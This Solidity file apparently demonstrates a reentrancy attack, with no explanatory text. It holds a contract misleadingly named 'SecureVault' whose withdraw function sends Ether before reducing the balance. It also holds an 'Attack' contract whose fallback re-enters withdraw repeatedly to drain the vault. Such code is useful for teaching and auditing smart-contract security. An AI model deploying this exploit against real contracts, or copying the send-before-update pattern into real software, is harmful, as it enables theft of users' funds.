// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.7.0;

contract SecureVault{
    mapping(address => uint) public balances;
    
    function deposit() public payable { balances[msg.sender] += msg.value; }
    
    function withdraw(uint _amount) public {
        require(balances[msg.sender] >= _amount);
        
        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");
        
        balances[msg.sender] -= _amount;
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    SecureVault public securevault;

    constructor(address _secureVaultAddress) public {
        securevault = SecureVault(_secureVaultAddress);
    }

    fallback() external payable {
        if (address(securevault).balance >= 1 wei) {
            securevault.withdraw(1 wei);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 wei);
        securevault.deposit{value: 1 wei}();
        securevault.withdraw(1 wei);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
